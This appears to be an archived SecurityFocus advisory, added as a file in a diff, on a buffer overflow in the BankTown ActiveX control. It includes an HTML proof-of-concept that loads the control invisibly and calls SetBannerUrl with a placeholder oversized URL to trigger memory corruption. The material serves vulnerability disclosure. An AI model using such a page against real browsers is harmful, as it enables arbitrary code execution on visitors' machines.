@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/17815/info
+
+BankTown ActiveX control is prone to a buffer-overflow vulnerability. The software fails to perform sufficient bounds-checking of user-supplied input before copying it to an insufficiently sized memory buffer.
+
+Invoking the object from a malicious website may trigger the condition. If the vulnerability were successfully exploited, this would corrupt process memory, resulting in arbitrary code execution. Arbitrary code would be executed in the context of the client application.
+
+<snip code>
+<BODY>
+<OBJECT id="GotBT" width=0 height=0
+classid="CLSID:C572979D-8383-4CCA-A37A-0F7CC3B62D81"
+       CODEBASE="http://download.banktown.com/XXXXXXXXXXXXX/BtCxSFM20F.cab#version=1,4,2,51817">
+</OBJECT>
+
+<script language=javascript>
+<!--
+function go() {
+        var str1 = "Hacked";
+        var str2 = "http://www.hacked_X_.org/Magic_length/Magic_strings";
+       val = GotBT.SetBannerUrl(str2, str1);
+}
+go();
+</SCRIPT>
+</body>
+</snip code>
